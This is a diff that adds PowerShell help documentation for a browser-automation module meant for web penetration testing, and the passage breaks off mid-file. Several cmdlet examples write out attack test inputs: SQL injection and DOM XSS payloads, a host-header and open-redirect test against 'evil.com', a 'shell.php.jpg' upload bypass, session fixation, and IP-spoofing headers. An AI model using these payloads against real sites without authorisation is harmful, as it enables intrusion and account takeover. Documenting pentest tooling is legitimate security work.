@@ -1,0 +1,1611 @@
+<?xml version="1.0" encoding="utf-8"?>
+<helpItems schema="maml" xmlns="http://msh">
+
+  <!-- Start-PupBrowser -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Start-PupBrowser</command:name>
+      <command:verb>Start</command:verb>
+      <command:noun>PupBrowser</command:noun>
+      <maml:description>
+        <maml:para>Starts a new browser instance for web automation and pentesting.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Launches a Chromium-based browser with optional proxy, user agent, and stealth mode settings. The browser can run in headless mode for automated testing or with a visible window for debugging.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Start a headless browser</maml:title>
+        <dev:code>$browser = Start-PupBrowser -Headless</dev:code>
+        <dev:remarks>
+          <maml:para>Starts a headless browser instance for automated testing.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Start browser with Burp proxy</maml:title>
+        <dev:code>$browser = Start-PupBrowser -Headless -Proxy "127.0.0.1:8080"</dev:code>
+        <dev:remarks>
+          <maml:para>Routes all traffic through Burp Suite for interception and analysis.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Start browser with custom user agent</maml:title>
+        <dev:code>$browser = Start-PupBrowser -Headless -UserAgent "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"</dev:code>
+        <dev:remarks>
+          <maml:para>Spoofs the user agent to emulate a mobile device.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- New-PupPage -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>New-PupPage</command:name>
+      <command:verb>New</command:verb>
+      <command:noun>PupPage</command:noun>
+      <maml:description>
+        <maml:para>Creates a new browser page (tab) and optionally navigates to a URL.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Creates a new page in the browser with stealth mode automatically enabled. Network and console capture are initialized for pentesting purposes.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Create a blank page</maml:title>
+        <dev:code>$page = New-PupPage -Browser $browser</dev:code>
+        <dev:remarks>
+          <maml:para>Creates a new blank page ready for navigation.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Navigate to a URL and wait for load</maml:title>
+        <dev:code>$page = New-PupPage -Browser $browser -Url "https://target.com" -WaitForLoad</dev:code>
+        <dev:remarks>
+          <maml:para>Creates a page and navigates to the target, waiting for the page to fully load.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Find-PupElements -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Find-PupElements</command:name>
+      <command:verb>Find</command:verb>
+      <command:noun>PupElements</command:noun>
+      <maml:description>
+        <maml:para>Finds elements on a page using CSS selectors or XPath.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Searches for elements matching the given selector. Returns element objects that can be used for interaction (click, type, etc.).</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Find element by ID</maml:title>
+        <dev:code>$loginBtn = Find-PupElements -Page $page -Selector "#login-button" -First</dev:code>
+        <dev:remarks>
+          <maml:para>Finds the first element with ID "login-button".</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Find all form inputs</maml:title>
+        <dev:code>$inputs = Find-PupElements -Page $page -Selector "form input"</dev:code>
+        <dev:remarks>
+          <maml:para>Returns all input elements within forms on the page.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Find element by XPath</maml:title>
+        <dev:code>$el = Find-PupElements -Page $page -Selector "//input[@name='csrf_token']" -XPath -First</dev:code>
+        <dev:remarks>
+          <maml:para>Uses XPath to find CSRF token input fields.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Get-PupPageNetwork -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Get-PupPageNetwork</command:name>
+      <command:verb>Get</command:verb>
+      <command:noun>PupPageNetwork</command:noun>
+      <maml:description>
+        <maml:para>Retrieves captured network requests and responses from a page.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Returns all HTTP requests made by the page, including URLs, methods, status codes, headers, and optionally response bodies. Essential for analyzing API calls and finding sensitive data.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Get all network requests</maml:title>
+        <dev:code>$requests = Get-PupPageNetwork -Page $page
+$requests | Format-Table Method, Status, Url</dev:code>
+        <dev:remarks>
+          <maml:para>Lists all captured requests with their method, status, and URL.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Get requests with response bodies</maml:title>
+        <dev:code>$requests = Get-PupPageNetwork -Page $page -IncludeContent
+$apiCalls = $requests | Where-Object { $_.Url -like "*api*" }
+$apiCalls | ForEach-Object { $_.Body }</dev:code>
+        <dev:remarks>
+          <maml:para>Captures response bodies and filters for API calls to analyze responses.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Find requests with sensitive headers</maml:title>
+        <dev:code>$requests = Get-PupPageNetwork -Page $page
+$requests | Where-Object { $_.RequestHeaders["Authorization"] } | Select-Object Url, @{N="Auth";E={$_.RequestHeaders["Authorization"]}}</dev:code>
+        <dev:remarks>
+          <maml:para>Finds requests containing Authorization headers for token analysis.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Get-PupWebSocket -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Get-PupWebSocket</command:name>
+      <command:verb>Get</command:verb>
+      <command:noun>PupWebSocket</command:noun>
+      <maml:description>
+        <maml:para>Lists WebSocket connections and their message frames.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Returns all WebSocket connections made by the page, including connection state, URL, and all sent/received message frames. Useful for testing real-time APIs.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: List all WebSocket connections</maml:title>
+        <dev:code>$websockets = Get-PupWebSocket -Page $page
+$websockets | Format-List Url, State, @{N="FrameCount";E={$_.Frames.Count}}</dev:code>
+        <dev:remarks>
+          <maml:para>Shows all WebSocket connections with their state and frame count.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: View WebSocket messages</maml:title>
+        <dev:code>$ws = Get-PupWebSocket -Page $page | Select-Object -First 1
+$ws.Frames | Format-Table Direction, Timestamp, PayloadData</dev:code>
+        <dev:remarks>
+          <maml:para>Displays all messages sent and received through the WebSocket.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Filter active connections</maml:title>
+        <dev:code>$active = Get-PupWebSocket -Page $page -Active
+$active | Where-Object { $_.Url -like "*chat*" }</dev:code>
+        <dev:remarks>
+          <maml:para>Gets only open WebSocket connections and filters for chat endpoints.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Send-PupWebSocketMessage -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Send-PupWebSocketMessage</command:name>
+      <command:verb>Send</command:verb>
+      <command:noun>PupWebSocketMessage</command:noun>
+      <maml:description>
+        <maml:para>Sends a message through an active WebSocket connection.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Injects a message into an open WebSocket connection on the page. Useful for testing WebSocket-based APIs and real-time features.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Send a simple message</maml:title>
+        <dev:code>Send-PupWebSocketMessage -Page $page -Message '{"action":"ping"}'</dev:code>
+        <dev:remarks>
+          <maml:para>Sends a JSON message through the first available WebSocket.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Target specific WebSocket by URL</maml:title>
+        <dev:code>Send-PupWebSocketMessage -Page $page -Message '{"cmd":"admin"}' -Url "api.target.com"</dev:code>
+        <dev:remarks>
+          <maml:para>Sends a message to a specific WebSocket matching the URL pattern.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Set-PupHttpHeader -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Set-PupHttpHeader</command:name>
+      <command:verb>Set</command:verb>
+      <command:noun>PupHttpHeader</command:noun>
+      <maml:description>
+        <maml:para>Sets custom HTTP headers for all requests from a page.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Adds custom headers to every HTTP request made by the page. Useful for injecting authorization tokens, spoofing IP addresses, or testing header-based vulnerabilities.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Add authorization header</maml:title>
+        <dev:code>Set-PupHttpHeader -Page $page -Name "Authorization" -Value "Bearer eyJhbG..."</dev:code>
+        <dev:remarks>
+          <maml:para>Adds a Bearer token to all subsequent requests.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Spoof client IP</maml:title>
+        <dev:code>Set-PupHttpHeader -Page $page -Headers @{
+    "X-Forwarded-For" = "127.0.0.1"
+    "X-Real-IP" = "127.0.0.1"
+}</dev:code>
+        <dev:remarks>
+          <maml:para>Sets headers to bypass IP-based access controls.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Test for host header injection</maml:title>
+        <dev:code>Set-PupHttpHeader -Page $page -Name "X-Forwarded-Host" -Value "evil.com"</dev:code>
+        <dev:remarks>
+          <maml:para>Tests for host header injection vulnerabilities.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 4: Clear all custom headers</maml:title>
+        <dev:code>Set-PupHttpHeader -Page $page -Clear</dev:code>
+        <dev:remarks>
+          <maml:para>Removes all previously set custom headers.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Set-PupHttpAuth -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Set-PupHttpAuth</command:name>
+      <command:verb>Set</command:verb>
+      <command:noun>PupHttpAuth</command:noun>
+      <maml:description>
+        <maml:para>Sets HTTP Basic Authentication credentials for a page.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Configures credentials to automatically respond to HTTP Basic Authentication challenges. The credentials are used for all requests from the page.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Set basic auth credentials</maml:title>
+        <dev:code>Set-PupHttpAuth -Page $page -Username "admin" -Password "admin"
+Move-PupPage -Page $page -Url "https://target.com/admin" -WaitForLoad</dev:code>
+        <dev:remarks>
+          <maml:para>Sets credentials before navigating to a protected endpoint.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Use PSCredential for secure password handling</maml:title>
+        <dev:code>$cred = Get-Credential
+Set-PupHttpAuth -Page $page -Credential $cred</dev:code>
+        <dev:remarks>
+          <maml:para>Uses PowerShell's secure credential prompt.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Clear authentication</maml:title>
+        <dev:code>Set-PupHttpAuth -Page $page -Clear</dev:code>
+        <dev:remarks>
+          <maml:para>Removes authentication credentials from the page.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Send-PupFile -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Send-PupFile</command:name>
+      <command:verb>Send</command:verb>
+      <command:noun>PupFile</command:noun>
+      <maml:description>
+        <maml:para>Uploads files through a file input element.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Sets the files for a file input element, simulating a user selecting files for upload. Supports single and multiple file uploads.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Upload a single file</maml:title>
+        <dev:code>$fileInput = Find-PupElements -Page $page -Selector "input[type=file]" -First
+Send-PupFile -Element $fileInput -FilePath "C:\payloads\test.pdf"</dev:code>
+        <dev:remarks>
+          <maml:para>Uploads a PDF file through the file input.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Upload multiple files</maml:title>
+        <dev:code>$fileInput = Find-PupElements -Page $page -Selector "#attachments" -First
+Send-PupFile -Element $fileInput -FilePath "doc1.pdf", "doc2.pdf", "image.png"</dev:code>
+        <dev:remarks>
+          <maml:para>Uploads multiple files at once (for inputs with 'multiple' attribute).</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Test file upload vulnerabilities</maml:title>
+        <dev:code>$fileInput = Find-PupElements -Page $page -Selector "input[type=file]" -First
+Send-PupFile -Element $fileInput -FilePath "shell.php.jpg"
+$submitBtn = Find-PupElements -Page $page -Selector "#upload-btn" -First
+$submitBtn | Invoke-PupElementClick</dev:code>
+        <dev:remarks>
+          <maml:para>Tests file upload bypass with double extension.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Set-PupPageCookie -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Set-PupPageCookie</command:name>
+      <command:verb>Set</command:verb>
+      <command:noun>PupPageCookie</command:noun>
+      <maml:description>
+        <maml:para>Sets a cookie on the page.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Creates or modifies cookies with full control over name, value, domain, path, expiration, and security flags. Essential for session manipulation and testing cookie-based vulnerabilities.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Set a session cookie</maml:title>
+        <dev:code>Set-PupPageCookie -Page $page -Name "session" -Value "admin_session_token" -Domain "target.com"</dev:code>
+        <dev:remarks>
+          <maml:para>Sets a session cookie to impersonate an admin user.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Set cookie with security flags</maml:title>
+        <dev:code>Set-PupPageCookie -Page $page -Name "auth" -Value "token123" -Domain "target.com" -HttpOnly -Secure -SameSite Strict</dev:code>
+        <dev:remarks>
+          <maml:para>Creates a secure cookie with HttpOnly and SameSite flags.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Test session fixation</maml:title>
+        <dev:code># Set a known session ID before authentication
+Set-PupPageCookie -Page $page -Name "PHPSESSID" -Value "fixated_session_id" -Domain "target.com"
+# Navigate to login and authenticate...</dev:code>
+        <dev:remarks>
+          <maml:para>Tests for session fixation vulnerabilities.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Invoke-PupPageScript -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Invoke-PupPageScript</command:name>
+      <command:verb>Invoke</command:verb>
+      <command:noun>PupPageScript</command:noun>
+      <maml:description>
+        <maml:para>Executes JavaScript code in the page context.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Runs arbitrary JavaScript in the browser page context. Can return values of various types. Powerful for DOM manipulation, extracting data, and testing XSS scenarios.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Extract CSRF token</maml:title>
+        <dev:code>$csrf = Invoke-PupPageScript -Page $page -Script "() => document.querySelector('input[name=csrf]').value" -AsString</dev:code>
+        <dev:remarks>
+          <maml:para>Extracts a CSRF token from a hidden form field.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Get all form data</maml:title>
+        <dev:code>$formData = Invoke-PupPageScript -Page $page -Script @"
+() => {
+    const form = document.querySelector('form');
+    const data = new FormData(form);
+    return Object.fromEntries(data.entries());
+}
+"@</dev:code>
+        <dev:remarks>
+          <maml:para>Extracts all form field names and values.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Test DOM-based XSS</maml:title>
+        <dev:code>Invoke-PupPageScript -Page $page -Script "() => { document.body.innerHTML += '&lt;img src=x onerror=alert(1)&gt;'; }" -AsVoid</dev:code>
+        <dev:remarks>
+          <maml:para>Injects content to test for DOM-based XSS.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Stop-PupBrowser -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Stop-PupBrowser</command:name>
+      <maml:description>
+        <maml:para>Stops a running browser instance.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Closes the browser and releases all resources. All pages associated with the browser will be closed.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Stop a browser</maml:title>
+        <dev:code>Stop-PupBrowser -Browser $browser</dev:code>
+        <dev:remarks>
+          <maml:para>Closes the browser instance.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Stop via pipeline</maml:title>
+        <dev:code>$browser | Stop-PupBrowser</dev:code>
+        <dev:remarks>
+          <maml:para>Stops the browser using pipeline input.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Stop all running browsers</maml:title>
+        <dev:code>Get-PupBrowser | Where-Object Running | Stop-PupBrowser</dev:code>
+        <dev:remarks>
+          <maml:para>Finds and stops all running browser instances.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Get-PupBrowser -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Get-PupBrowser</command:name>
+      <maml:description>
+        <maml:para>Gets browser instances from the current session.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Returns browser objects that were started in the current PowerShell session. Useful for managing multiple browser instances.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Get all browsers</maml:title>
+        <dev:code>Get-PupBrowser</dev:code>
+        <dev:remarks>
+          <maml:para>Lists all browser instances in the session.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Check browser status</maml:title>
+        <dev:code>Get-PupBrowser | Select-Object BrowserType, Running, Headless, ProcessId</dev:code>
+        <dev:remarks>
+          <maml:para>Shows status information for all browsers.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Move-PupPage -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Move-PupPage</command:name>
+      <maml:description>
+        <maml:para>Navigates a page to a new URL.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Navigates the page to the specified URL. Can optionally wait for the page to fully load before returning.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Navigate to URL</maml:title>
+        <dev:code>Move-PupPage -Page $page -Url "https://target.com/login" -WaitForLoad</dev:code>
+        <dev:remarks>
+          <maml:para>Navigates to the login page and waits for it to load.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Navigate without waiting</maml:title>
+        <dev:code>Move-PupPage -Page $page -Url "https://target.com/api/data"</dev:code>
+        <dev:remarks>
+          <maml:para>Starts navigation without waiting for completion.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Test for open redirects</maml:title>
+        <dev:code>Move-PupPage -Page $page -Url "https://target.com/redirect?url=https://evil.com" -WaitForLoad
+$page.Page.Url  # Check if redirected to evil.com</dev:code>
+        <dev:remarks>
+          <maml:para>Tests for open redirect vulnerabilities.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Remove-PupPage -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Remove-PupPage</command:name>
+      <maml:description>
+        <maml:para>Closes a browser page.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Closes the specified page (tab) in the browser. The page object should not be used after removal.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Close a page</maml:title>
+        <dev:code>Remove-PupPage -Page $page</dev:code>
+        <dev:remarks>
+          <maml:para>Closes the browser tab.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Invoke-PupElementClick -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Invoke-PupElementClick</command:name>
+      <maml:description>
+        <maml:para>Clicks on an element.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Simulates a mouse click on the specified element. The element is scrolled into view if necessary.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Click a button</maml:title>
+        <dev:code>$btn = Find-PupElements -Page $page -Selector "#submit" -First
+$btn | Invoke-PupElementClick</dev:code>
+        <dev:remarks>
+          <maml:para>Finds and clicks the submit button.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Click and wait for navigation</maml:title>
+        <dev:code>$link = Find-PupElements -Page $page -Selector "a.admin-link" -First
+$link | Invoke-PupElementClick
+Start-Sleep -Seconds 2  # Wait for navigation</dev:code>
+        <dev:remarks>
+          <maml:para>Clicks a link and waits for the page to load.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Set-PupElement -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Set-PupElement</command:name>
+      <maml:description>
+        <maml:para>Types text into an element or sets its value.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Types text character by character into an input element, or directly sets its value. Can optionally clear existing content first.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Type into input field</maml:title>
+        <dev:code>$username = Find-PupElements -Page $page -Selector "#username" -First
+Set-PupElement -Element $username -Text "admin"</dev:code>
+        <dev:remarks>
+          <maml:para>Types "admin" into the username field.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Clear and type new value</maml:title>
+        <dev:code>$input = Find-PupElements -Page $page -Selector "#search" -First
+Set-PupElement -Element $input -Text "new search" -Clear</dev:code>
+        <dev:remarks>
+          <maml:para>Clears existing text and types new content.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Set value directly (faster)</maml:title>
+        <dev:code>$input = Find-PupElements -Page $page -Selector "#token" -First
+Set-PupElement -Element $input -Value "injected_value"</dev:code>
+        <dev:remarks>
+          <maml:para>Sets the value property directly without typing.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 4: Test SQL injection</maml:title>
+        <dev:code>$search = Find-PupElements -Page $page -Selector "#search" -First
+Set-PupElement -Element $search -Text "' OR '1'='1" -Clear
+$submit = Find-PupElements -Page $page -Selector "#submit" -First
+$submit | Invoke-PupElementClick</dev:code>
+        <dev:remarks>
+          <maml:para>Enters SQL injection payload into a search field.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Wait-PupElement -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Wait-PupElement</command:name>
+      <maml:description>
+        <maml:para>Waits for an element to appear or meet a condition.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Waits until an element matching the selector appears in the DOM, becomes visible, enabled, or meets other conditions. Essential for handling dynamic content.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Wait for element to appear</maml:title>
+        <dev:code>Wait-PupElement -Page $page -Selector "#dynamic-content" -Timeout 10000</dev:code>
+        <dev:remarks>
+          <maml:para>Waits up to 10 seconds for the element to appear.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Wait for element to be visible</maml:title>
+        <dev:code>Wait-PupElement -Page $page -Selector "#modal" -Visible -Timeout 5000</dev:code>
+        <dev:remarks>
+          <maml:para>Waits for a modal dialog to become visible.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Wait for button to be enabled</maml:title>
+        <dev:code>Wait-PupElement -Page $page -Selector "#submit-btn" -Enabled -Timeout 5000
+$btn = Find-PupElements -Page $page -Selector "#submit-btn" -First
+$btn | Invoke-PupElementClick</dev:code>
+        <dev:remarks>
+          <maml:para>Waits for a button to become enabled before clicking.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 4: Wait for specific text</maml:title>
+        <dev:code>Wait-PupElement -Page $page -Selector "#status" -TextContains "Complete" -Timeout 30000</dev:code>
+        <dev:remarks>
+          <maml:para>Waits for a status element to contain "Complete".</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Get-PupPageCookie -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Get-PupPageCookie</command:name>
+      <maml:description>
+        <maml:para>Gets cookies from a page.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Returns cookies associated with the page. Can filter by name or domain. Useful for inspecting session tokens and authentication cookies.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Get all cookies</maml:title>
+        <dev:code>$cookies = Get-PupPageCookie -Page $page
+$cookies | Format-Table Name, Value, Domain, HttpOnly, Secure</dev:code>
+        <dev:remarks>
+          <maml:para>Lists all cookies with their security flags.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Get session cookie</maml:title>
+        <dev:code>$session = Get-PupPageCookie -Page $page -Name "session"
+$session.Value</dev:code>
+        <dev:remarks>
+          <maml:para>Retrieves the session cookie value.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Check for insecure cookies</maml:title>
+        <dev:code>Get-PupPageCookie -Page $page | Where-Object { -not $_.HttpOnly -or -not $_.Secure } |
+    Select-Object Name, HttpOnly, Secure</dev:code>
+        <dev:remarks>
+          <maml:para>Finds cookies missing HttpOnly or Secure flags.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Remove-PupPageCookie -->
